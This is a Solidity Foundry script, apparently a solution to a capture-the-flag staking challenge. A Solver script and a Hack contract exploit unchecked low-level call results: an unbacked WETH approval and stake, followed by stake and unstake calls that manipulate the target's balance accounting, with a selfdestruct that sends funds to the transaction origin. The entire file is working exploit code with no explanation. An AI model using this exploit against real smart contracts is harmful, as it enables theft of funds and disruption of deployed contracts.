
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address stake = vm.envAddress("STAKE_INSTANCE");
    address weth = vm.envAddress("WETH_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        stake.call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        stake.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether + 1));
        
        Hack hack = new Hack(stake, weth);
        hack.pwn{value: 0.001 ether + 2}();

        vm.stopBroadcast();
    }
}


contract Hack {
    address stake;
    address weth;

    constructor(address _stake, address _weth) {
        stake = _stake;
        weth = _weth;
    }

    function pwn() external payable {
        weth.call(abi.encodeWithSignature("approve(address,uint256)", stake, type(uint256).max));
        stake.call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
        stake.call{value: 0.001 ether + 2}(abi.encodeWithSignature("StakeETH()"));
        stake.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
    }

    receive() external payable {
        selfdestruct(payable(tx.origin));
    }
}